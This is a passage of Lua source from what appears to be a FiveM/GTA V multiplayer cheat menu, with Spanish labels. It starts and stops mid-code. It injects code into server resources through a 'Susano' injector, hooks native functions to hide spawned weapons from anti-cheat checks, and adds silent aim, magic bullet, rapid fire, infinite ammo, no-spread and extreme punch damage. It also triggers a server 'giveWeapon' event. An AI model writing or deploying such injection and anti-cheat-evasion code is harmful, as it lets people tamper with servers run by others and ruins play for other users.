            EnableControlAction(0, 242, true)  

            UpdateFreecam()
        end

        DrawFreecamMenu()
    end
end)

                    do
                        Actions.shootEyesItem = FindItem("Combate", "General", "Disparar ojos")
                        if Actions.shootEyesItem then
                            Actions.shootEyesItem.onClick = function(value)
                                Menu.shooteyesEnabled = value
                            end
                        end
                    end

                    do
                        Actions.superPunchItem = FindItem("Combate", "General", "Super punetazo")
                        if Actions.superPunchItem then
                            Actions.superPunchItem.onClick = function(value)
                                Menu.superPunchEnabled = value
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)
                            if Menu.superPunchEnabled then
                                SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 999999.0)
                                SetWeaponDamageModifier(GetHashKey("WEAPON_KNUCKLE"), 999999.0)
                            else
                                SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
                                SetWeaponDamageModifier(GetHashKey("WEAPON_KNUCKLE"), 1.0)
                            end
                        end
                    end)

                    do
                        local weaponOptions = {
                            {name = "dar arma_aa", weapon = "weapon_aa"},
                            {name = "dar arma_caveira", weapon = "weapon_caveira"},
                            {name = "dar arma_SCOM", weapon = "weapon_SCOM"},
                            {name = "dar arma_mcx", weapon = "weapon_mcx"},
                            {name = "dar arma_grau", weapon = "weapon_grau"},
                            {name = "dar arma_midasgun", weapon = "weapon_midasgun"},
                            {name = "dar arma_hackingdevice", weapon = "weapon_hackingdevice"},
                            {name = "dar arma_akorus", weapon = "weapon_akorus"},
                            {name = "dar WEAPON_MIDGARD", weapon = "WEAPON_MIDGARD"},
                            {name = "dar motosierra", weapon = "weapon_chainsaw"}
                        }

                        local weaponHashMap = {
                            ["weapon_aa"] = GetHashKey("weapon_aa"),
                            ["weapon_caveira"] = GetHashKey("weapon_caveira"),
                            ["weapon_SCOM"] = GetHashKey("weapon_SCOM"),
                            ["weapon_mcx"] = GetHashKey("weapon_mcx"),
                            ["weapon_grau"] = GetHashKey("weapon_grau"),
                            ["weapon_midasgun"] = GetHashKey("weapon_midasgun"),
                            ["weapon_hackingdevice"] = GetHashKey("weapon_hackingdevice"),
                            ["weapon_akorus"] = GetHashKey("weapon_akorus"),
                            ["WEAPON_MIDGARD"] = GetHashKey("WEAPON_MIDGARD"),
                            ["weapon_chainsaw"] = GetHashKey("weapon_chainsaw"),
                        }

                        local function GiveWeaponByHash(hash, ammo)
                            local weaponHash = nil
                            local hashString = tostring(hash)

                            if type(hash) == "number" then
                                weaponHash = hash
                            else
                                weaponHash = GetHashKey(hashString)
                            end

                            local weaponAA = GetHashKey("weapon_aa")
                            local weaponCaveira = GetHashKey("weapon_caveira")
                            ammo = ammo or 250

                            local ped = PlayerPedId()

                            local function ForceGiveWeapon(weaponName)
                                local testHash = GetHashKey(weaponName)
                                if testHash and testHash ~= 0 then
                                    if HasWeaponAssetLoaded and HasWeaponAssetLoaded(testHash) == 0 then
                                        RequestWeaponAsset(testHash, 31, 0)
                                        local timeout = 0
                                        while HasWeaponAssetLoaded and HasWeaponAssetLoaded(testHash) == 0 and timeout < 50 do
                                            Wait(10)
                                            timeout = timeout + 1
                                        end
                                    end

                                    GiveWeaponToPed(ped, testHash, ammo, false, true)
                                    SetPedAmmo(ped, testHash, ammo)
                                    SetCurrentPedWeapon(ped, testHash, true)
                                    SetPedInfiniteAmmoClip(ped, true)
                                    Wait(100)
                                    if HasPedGotWeapon(ped, testHash, false) then
                                        return true
                                    end
                                end
                                return false
                            end

                            if weaponHash == weaponAA or (hashString and (hashString:lower() == "weapon_aa")) then
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", string.format([[
                                        local susano = rawget(_G, "Susano")
                                        if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                                            susano.HookNative(0x3A87E44BB9A01D54, function(ped, weaponHash) return true, -1569615261 end)

                                            susano.HookNative(0xADF692B254977C0C, function(ped, weapon, equipNow)
                                                if weapon == -1569615261 then
                                                    return true
                                                end
                                                return true
                                            end)

                                            susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1) return end)

                                            susano.HookNative(0x4899CB088EDF3BCC, function(ped, weaponHash, p2) return end)

                                            susano.HookNative(0x3795688A307E1EB6, function(ped) return false end)
                                            susano.HookNative(0x0A6DB4965674D243, function(ped) return -1569615261 end)
                                            susano.HookNative(0xC3287EE3050FB74C, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x475768A975D5AD17, function(ped, p1) return false end)
                                            susano.HookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2) return false end)
                                            susano.HookNative(0x34616828CD07F1A1, function(ped) return false end)
                                            susano.HookNative(0x3A50753042A63901, function(ped) return false end)
                                            susano.HookNative(0xB2A38826EAB6BCF1, function(ped) return false end)
                                            susano.HookNative(0xED958C9C056BF401, function(ped) return false end)
                                            susano.HookNative(0x8483E98E8B888A2D, function(ped, p1) return -1569615261 end)
                                            susano.HookNative(0xA38DCFFCE89696FA, function(ped, weaponHash) return 0 end)
                                            susano.HookNative(0x7FEAD38B326B9F74, function(ped, weaponHash) return 0 end)
                                            susano.HookNative(0x3B390A939AF0B5FC, function(ped) return -1 end)
                                            susano.HookNative(0x59DE03442B6C9598, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return 0.3 end)
                                            susano.HookNative(0x97A790315D3831FD, function(entity) return 0 end)
                                            susano.HookNative(0x48C2BED9180FE123, function(entity) return false end)
                                            susano.HookNative(0x89CF5FF3D310A0DB, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x24B600C29F7F8A9E, function(ped) return false end)
                                            susano.HookNative(0x8483E98E8B888AE2, function(ped, p1) return -1569615261 end)
                                            susano.HookNative(0xCAE1DC9A0E22A16D, function(ped) return 0 end)
                                            susano.HookNative(0x4899CB088EDF59B8, function(ped, weaponHash) return end)
                                            susano.HookNative(0x2E1202248937775C, function(ped, weaponHash, ammo) return true, 9999 end)
                                            susano.HookNative(0x2B9EEDC07BD06B9F, function(ped, weaponHash) return 0 end)
                                        end

                                        local _GetCurrentPedWeapon = GetCurrentPedWeapon
                                        local _RemoveAllPedWeapons = RemoveAllPedWeapons
                                        local _RemoveWeaponFromPed = RemoveWeaponFromPed
                                        local _SetCurrentPedWeapon = SetCurrentPedWeapon

                                        GetCurrentPedWeapon = function(ped, ...)
                                            return true, GetHashKey("WEAPON_UNARMED")
                                        end

                                        RemoveAllPedWeapons = function(ped, ...) return end

                                        RemoveWeaponFromPed = function(ped, weapon) return end

                                        SetCurrentPedWeapon = function(ped, weapon, ...)
                                            if weapon == GetHashKey("WEAPON_UNARMED") then
                                                return _SetCurrentPedWeapon(ped, weapon, ...)
                                            end
                                            return
                                        end

                                        local weaponAAHash = GetHashKey("weapon_aa")
                                        local weaponCaveiraHash = GetHashKey("weapon_caveira")
                                        local weaponPenisHash = GetHashKey("weapon_penis")
                                        local weaponPenisHash = GetHashKey("weapon_grau")
                                        local weaponPenisHash = GetHashKey("weapon_mcx")
                                        local weaponPenisHash = GetHashKey("weapon_midasgun")
                                        local weaponPenisHash = GetHashKey("weapon_hackingdevice")
                                        local weaponPenisHash = GetHashKey("weapon_akorus")
                                        local weaponPenisHash = GetHashKey("weapon_midgard")
                                        local weaponPenisHash = GetHashKey("weapon_chainsaw")
                                        local selfPed = PlayerPedId()

                                        GiveWeaponToPed(selfPed, weaponAAHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponAAHash, 999)

                                        GiveWeaponToPed(selfPed, weaponCaveiraHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponCaveiraHash, 999)

                                        GiveWeaponToPed(selfPed, weaponPenisHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponPenisHash, 999)

                                        _SetCurrentPedWeapon(selfPed, weaponAAHash, true)
                                    ]]))
                                end
                            else
                                local mappedHash = weaponHashMap[hashString]
                                if mappedHash and mappedHash ~= 0 then
                                    if ForceGiveWeapon(hashString) then
                                        return
                                    end
                                end

                                local variants = {
                                    hashString,
                                    hashString:upper(),
                                    hashString:lower(),
                                    "WEAPON_" .. hashString:upper(),
                                    "WEAPON_" .. hashString:gsub("WEAPON_", ""):upper(),
                                    hashString:gsub("WEAPON_", ""):upper(),
                                    hashString:gsub("weapon_", ""):upper(),
                                    hashString:gsub("weapon_", "WEAPON_"),
                                    hashString:gsub("WEAPON_", "weapon_"),
                                }

                                local given = false
                                for _, variant in ipairs(variants) do
                                    if ForceGiveWeapon(variant) then
                                        given = true
                                        break
                                    end
                                end

                                if not given then
                                    local allHashes = {
                                        weaponHash,
                                        mappedHash,
                                        GetHashKey(hashString),
                                        GetHashKey(hashString:upper()),
                                        GetHashKey(hashString:lower()),
                                    }

                                    for _, testHash in ipairs(allHashes) do
                                        if testHash then
                                            GiveWeaponToPed(ped, testHash, ammo, false, true)
                                            SetPedAmmo(ped, testHash, ammo)
                                            SetCurrentPedWeapon(ped, testHash, true)
                                            SetPedInfiniteAmmoClip(ped, true)
                                            Wait(100)
                                            if HasPedGotWeapon(ped, testHash, false) then
                                                given = true
                                                break
                                            end
                                        end
                                    end

                                    if not given then
                                        local finalHash = GetHashKey(hashString)
                                        GiveWeaponToPed(ped, finalHash, ammo, false, true)
                                        SetPedAmmo(ped, finalHash, ammo)
                                        SetCurrentPedWeapon(ped, finalHash, true)
                                        SetPedInfiniteAmmoClip(ped, true)

                                        Wait(100)
                                        if not HasPedGotWeapon(ped, finalHash, false) then
                                            TriggerServerEvent("giveWeapon", hashString, ammo)
                                        end
                                    end
                                end
                            end
                        end

                        for _, weaponData in ipairs(weaponOptions) do
                            local weaponItem = FindItem("Combate", "Spawnear", weaponData.name)
                            if weaponItem then
                                weaponItem.onClick = function(value)
                                    if value then
                                        CreateThread(function()
                                            while weaponItem.value do
                                                GiveWeaponByHash(weaponData.weapon, 250)
                                                Wait(100)
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end

                    Actions.protectWeaponItem = FindItem("Combate", "Spawnear", "Proteger arma")
                    if Actions.protectWeaponItem then
                        Actions.protectWeaponItem.onClick = function(value)
                            if value then
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        local susano = rawget(_G, "Susano")
                                        if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                                            if not rawget(_G, 'weapon_protect_hooks_active') then
                                                rawset(_G, 'weapon_protect_hooks_active', true)

                                                susano.HookNative(0x3A87E44BB9A01D54, function(ped, weaponHash) return -1569615261 end)
                                                susano.HookNative(0x3795688A307E1EB6, function(ped) return false end)
                                                susano.HookNative(0x0A6DB4965674D243, function(ped) return -1569615261 end)
                                                susano.HookNative(0xC3287EE3050FB74C, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x475768A975D5AD17, function(ped, p1) return false end)
                                                susano.HookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2) return false end)
                                                susano.HookNative(0x34616828CD07F1A1, function(ped) return false end)
                                                susano.HookNative(0x3A50753042A63901, function(ped) return false end)
                                                susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1) return end)
                                                susano.HookNative(0x4899CB088EDF3BCC, function(ped, weaponHash, p2) return end)
                                                susano.HookNative(0xB2A38826EAB6BCF1, function(ped) return false end)
                                                susano.HookNative(0xED958C9C056BF401, function(ped) return false end)
                                                susano.HookNative(0x8483E98E8B888A2D, function(ped, p1) return -1569615261 end)
                                                susano.HookNative(0xA38DCFFCE89696FA, function(ped, weaponHash) return 0 end)
                                                susano.HookNative(0x7FEAD38B326B9F74, function(ped, weaponHash) return 0 end)
                                                susano.HookNative(0x3B390A939AF0B5FC, function(ped) return -1 end)
                                                susano.HookNative(0x59DE03442B6C9598, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return 0.3 end)
                                                susano.HookNative(0x97A790315D3831FD, function(entity) return 0 end)
                                                susano.HookNative(0x48C2BED9180FE123, function(entity) return false end)
                                                susano.HookNative(0x89CF5FF3D310A0DB, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x24B600C29F7F8A9E, function(ped) return false end)
                                                susano.HookNative(0x8483E98E8B888AE2, function(ped, p1) return -1569615261 end)
                                                susano.HookNative(0xCAE1DC9A0E22A16D, function(ped) return 0 end)
                                                susano.HookNative(0x4899CB088EDF59B8, function(ped, weaponHash) return end)
                                                susano.HookNative(0x2E1202248937775C, function(ped, weaponHash, ammo) return true, 9999 end)
                                                susano.HookNative(0x2B9EEDC07BD06B9F, function(ped, weaponHash) return 0 end)

                                                susano.HookNative(0xB0237302, function()
                                                    local selfPed = PlayerPedId()
                                                    local selfCurrentWeapon = SetCurrentPedWeapon
                                                    return selfCurrentWeapon(selfPed, GetHashKey("WEAPON_UNARMED"), true)
                                                end)

                                                susano.HookNative(0xC4D88A85, function(ped, weaponHash, ammo, ...)
                                                    return ped, weaponHash, ammo, ...
                                                end)

                                                local _GetCurrentPedWeapon = GetCurrentPedWeapon
                                                local _RemoveAllPedWeapons = RemoveAllPedWeapons
                                                local _RemoveWeaponFromPed = RemoveWeaponFromPed
                                                local _SetCurrentPedWeapon = SetCurrentPedWeapon

                                                GetCurrentPedWeapon = function(ped, ...)
                                                    return true, GetHashKey("WEAPON_UNARMED")
                                                end

                                                RemoveAllPedWeapons = function(ped, ...) return end

                                                RemoveWeaponFromPed = function(ped, weapon) return end

                                                SetCurrentPedWeapon = function(ped, weapon, ...)
                                                    if weapon == GetHashKey("WEAPON_UNARMED") then
                                                        return _SetCurrentPedWeapon(ped, weapon, ...)
                                                    end
                                                    return
                                                end
                                            end
                                        end
                                    ]])
                                end
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        rawset(_G, 'weapon_protect_hooks_active', false)
                                    ]])
                                end
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.shooteyesEnabled then
                                DrawRect(0.5, 0.5, 0.002, 0.003, 157, 0, 255, 255)
                                if IsControlPressed(0, 38) then
                                    local playerPed = PlayerPedId()
                                    local currentWeapon = GetSelectedPedWeapon(playerPed)

                                    if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                                        local weapons = {
                                            "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                                            "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                                            "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                                            "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                                            "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                                            "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                                            "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                                            "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                                            "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                                        }

                                        for _, weaponName in ipairs(weapons) do
                                            local weaponHash = GetHashKey(weaponName)
                                            if HasPedGotWeapon(playerPed, weaponHash, false) then
                                                currentWeapon = weaponHash
                                                break
                                            end
                                        end
                                    end

                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                        if not rawget(_G, 'shoot_eyes_cooldown') or GetGameTimer() > rawget(_G, 'shoot_eyes_cooldown') then
                                            local camCoords = GetGameplayCamCoord()
                                            local camRot = GetGameplayCamRot(0)

                                            local z = math.rad(camRot.z)
                                            local x = math.rad(camRot.x)
                                            local num = math.abs(math.cos(x))
                                            local dirX = -math.sin(z) * num
                                            local dirY = math.cos(z) * num
                                            local dirZ = math.sin(x)

                                            local distance = 1000.0
                                            local endX = camCoords.x + dirX * distance
                                            local endY = camCoords.y + dirY * distance
                                            local endZ = camCoords.z + dirZ * distance

                                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endX, endY, endZ, -1, playerPed, 0)
                                            local retval, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)

                                            local weaponCoords = GetOffsetFromEntityInWorldCoords(playerPed, 0.5, 1.0, 0.5)
                                            local targetCoords = vector3(endX, endY, endZ)

                                            if hit and hitCoords then
                                                targetCoords = hitCoords
                                            end

                                            ShootSingleBulletBetweenCoords(
                                                weaponCoords.x, weaponCoords.y, weaponCoords.z,
                                                targetCoords.x, targetCoords.y, targetCoords.z,
                                                25, true, currentWeapon, playerPed, true, false, 1000.0
                                            )

                                            rawset(_G, 'shoot_eyes_cooldown', GetGameTimer() + 350)
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    do
                        Actions.silentAimItem = FindItem("Combate", "General", "Apunta silencioso")
                        if Actions.silentAimItem then
                            Actions.silentAimItem.onClick = function(value)
                                Menu.silentAimEnabled = value
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.silentAimEnabled then
                                local playerPed = PlayerPedId()
                                if IsPedShooting(playerPed) then
                                    if not rawget(_G, 'silent_aim_cooldown') or GetGameTimer() > rawget(_G, 'silent_aim_cooldown') then
                                        local currentWeapon = GetSelectedPedWeapon(playerPed)
                                        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                            local playerCoords = GetEntityCoords(playerPed)
                                            local peds = GetGamePool('CPed')
                                            local targetPed = nil
                                            local bestDist = 999999.0

                                            for _, ped in ipairs(peds) do
                                                if ped ~= playerPed and DoesEntityExist(ped) and not IsPedDeadOrDying(ped, true) then
                                                    local pedCoords = GetEntityCoords(ped)
                                                    local onScreen, screenX, screenY = GetScreenCoordFromWorldCoord(pedCoords.x, pedCoords.y, pedCoords.z)
                                                    if onScreen then
                                                        local dist = #(pedCoords - playerCoords)
                                                        if dist < bestDist then
                                                            bestDist = dist
                                                                        targetPed = ped
                                                        end
                                                    end
                                                end
                                            end

                                            if targetPed then
                                                local boneIndex = 31086
                                                local targetBone = GetPedBoneIndex(targetPed, boneIndex)
                                                local targetCoords = GetWorldPositionOfEntityBone(targetPed, targetBone)

                                                    ShootSingleBulletBetweenCoords(
                                                    targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                                                        targetCoords.x, targetCoords.y, targetCoords.z,
                                                    25, true, currentWeapon, playerPed, true, false, 1000.0
                                                    )
                                                rawset(_G, 'silent_aim_cooldown', GetGameTimer() + 100)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                    end)

                    Actions.magicBulletItem = FindItem("Combate", "General", "Bala magica")
                    if Actions.magicBulletItem then
                        Actions.magicBulletItem.onClick = function(value)
                            Menu.magicbulletEnabled = value
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.magicbulletEnabled then
                                local playerPed = PlayerPedId()
                                if IsPedShooting(playerPed) then
                                    if not rawget(_G, 'magic_bullet_cooldown') or GetGameTimer() > rawget(_G, 'magic_bullet_cooldown') then

                                        local currentWeapon = GetSelectedPedWeapon(playerPed)

                                        if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                                            local weapons = {
                                                "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                                                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                                                "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                                                "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                                                "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                                                "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                                                "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                                                "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                                                "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                                            }
                                            for _, weaponName in ipairs(weapons) do
                                                local weaponHash = GetHashKey(weaponName)
                                                if HasPedGotWeapon(playerPed, weaponHash, false) then
                                                    currentWeapon = weaponHash
                                                    break
                                                end
                                            end
                                        end

                                        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                            local playerCoords = GetEntityCoords(playerPed)
                                            local camCoords = GetGameplayCamCoord()
                                            local camRot = GetGameplayCamRot(0)
                                            local z = math.rad(camRot.z)
                                            local x = math.rad(camRot.x)
                                            local num = math.abs(math.cos(x))
                                            local dirX = -math.sin(z) * num
                                            local dirY = math.cos(z) * num
                                            local dirZ = math.sin(x)

                                            local peds = GetGamePool('CPed')
                                            local targetPed = nil
                                            local bestScore = 999999
                                            local pedCount = 0

                                            for _, ped in ipairs(peds) do
                                                if pedCount >= 50 then break end
                                                if ped ~= playerPed and DoesEntityExist(ped) and not IsPedDeadOrDying(ped, true) then
                                                    pedCount = pedCount + 1
                                                    local pedCoords = GetEntityCoords(ped)
                                                    local distToPlayer = #(pedCoords - playerCoords)

                                                    if distToPlayer < 200.0 then
                                                            local vecX = pedCoords.x - camCoords.x
                                                            local vecY = pedCoords.y - camCoords.y
                                                            local vecZ = pedCoords.z - camCoords.z
                                                            local distToCam = math.sqrt(vecX * vecX + vecY * vecY + vecZ * vecZ)

                                                            if distToCam > 0 then
                                                                local normX = vecX / distToCam
                                                                local normY = vecY / distToCam
                                                                local normZ = vecZ / distToCam
                                                                local dotProduct = dirX * normX + dirY * normY + dirZ * normZ
                                                                local angle = math.acos(math.max(-1, math.min(1, dotProduct)))
                                                                local angleDeg = math.deg(angle)

                                                                if angleDeg < 15 then
                                                                    local score = angleDeg * 10 + distToPlayer * 0.1
                                                                    if score < bestScore then
                                                                        bestScore = score
                                                                        targetPed = ped
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end

                                            if targetPed and DoesEntityExist(targetPed) then
                                                local boneIndex = 31086
                                                local targetBone = GetPedBoneIndex(targetPed, boneIndex)
                                                local targetCoords = GetWorldPositionOfEntityBone(targetPed, targetBone)
                                                local offsetX = math.random(-10, 10) / 100.0
                                                local offsetY = math.random(-10, 10) / 100.0

                                                ShootSingleBulletBetweenCoords(
                                                    targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z + 0.1,
                                                    targetCoords.x, targetCoords.y, targetCoords.z,
                                                    25, true, currentWeapon, playerPed, true, false, 1000.0
                                                )
                                            end

                                            rawset(_G, 'magic_bullet_cooldown', GetGameTimer() + 100)
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    Actions.rapidFireItem = FindItem("Combate", "General", "Disparo rapido")
                    if Actions.rapidFireItem then
                        Actions.rapidFireItem.onClick = function(value)
                            Menu.rapidFireEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.rapidFireEnabled = %s
                                    _G.rapidFireLastShot = 0

                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.rapidFireEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    if IsControlPressed(0, 24) or IsPedShooting(playerPed) then
                                                        local currentTime = GetGameTimer()
                                                        if currentTime - (_G.rapidFireLastShot or 0) > 50 then
                                                            local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                            if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                                local ammo = GetAmmoInPedWeapon(playerPed, currentWeapon)
                                                                if ammo > 0 then
                                                                    SetPedAmmo(playerPed, currentWeapon, ammo - 1)

                                                                    local weaponDamage = GetWeaponDamage(currentWeapon)
                                                                    if weaponDamage == 0.0 then
                                                                        weaponDamage = 25.0
                                                                    end

                                                                    local camCoords = GetGameplayCamCoord()
                                                                    local camRot = GetGameplayCamRot(0)

                                                                    local z = math.rad(camRot.z)
                                                                    local x = math.rad(camRot.x)
                                                                    local num = math.abs(math.cos(x))
                                                                    local dirX = -math.sin(z) * num
                                                                    local dirY = math.cos(z) * num
                                                                    local dirZ = math.sin(x)

                                                                    local startX = camCoords.x
                                                                    local startY = camCoords.y
                                                                    local startZ = camCoords.z

                                                                    local distance = 1000.0
                                                                    local endX = startX + dirX * distance
                                                                    local endY = startY + dirY * distance
                                                                    local endZ = startZ + dirZ * distance

                                                                    ShootSingleBulletBetweenCoords(
                                                                        startX, startY, startZ,
                                                                        endX, endY, endZ,
                                                                        weaponDamage, true, currentWeapon, playerPed, true, false, 1000.0
                                                                    )

                                                                    _G.rapidFireLastShot = currentTime
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.infiniteAmmoItem = FindItem("Combate", "General", "Municion infinita")
                    if Actions.infiniteAmmoItem then
                        Actions.infiniteAmmoItem.onClick = function(value)
                            Menu.infiniteAmmoEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.infiniteAmmoEnabled = %s

                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.infiniteAmmoEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetPedAmmo(playerPed, currentWeapon, 9999)
                                                        SetAmmoInClip(playerPed, currentWeapon, 9999)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.noSpreadItem = FindItem("Combate", "General", "Sin dispersion")
                    if Actions.noSpreadItem then
                        Actions.noSpreadItem.onClick = function(value)
                            Menu.noSpreadEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.noSpreadEnabled = %s

                                    local s = rawget(_G, "Susano")
                                    if s and type(s) == "table" and type(s.HookNative) == "function" then
                                        if _G.noSpreadEnabled then
                                            s.HookNative(0x90A43CC281FFAB46, function() return 0.0 end)
                                            s.HookNative(0x5063F92F07C2A316, function() return 1.0 end)
                                        else
                                        end
                                    end

                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.noSpreadEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetWeaponDamageModifier(currentWeapon, 1.0)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.noRecoilItem = FindItem("Combate", "General", "Sin retroceso")
                    if Actions.noRecoilItem then
                        Actions.noRecoilItem.onClick = function(value)
                            Menu.noRecoilEnabled = value
                        end
                    end

                    Actions.giveAmmoItem = FindItem("Combate", "General", "Dar municion")
                    if Actions.giveAmmoItem then
                        Actions.giveAmmoItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        SetPedAmmo(ped, currentWeapon, 9999)
                                    end
                                ]])
                            else

                                local ped = PlayerPedId()
                                if ped and DoesEntityExist(ped) then
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        SetPedAmmo(ped, currentWeapon, 9999)
                                    end
                                end
                            end
                        end
                    end

                    Actions.giveAllAttachmentItem = FindItem("Combate", "General", "Dar todos los accesorios")
                    if Actions.giveAllAttachmentItem then
                        Actions.giveAllAttachmentItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then

                                        local components = {
                                            GetHashKey("COMPONENT_AT_AR_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_AR_FLSH"),
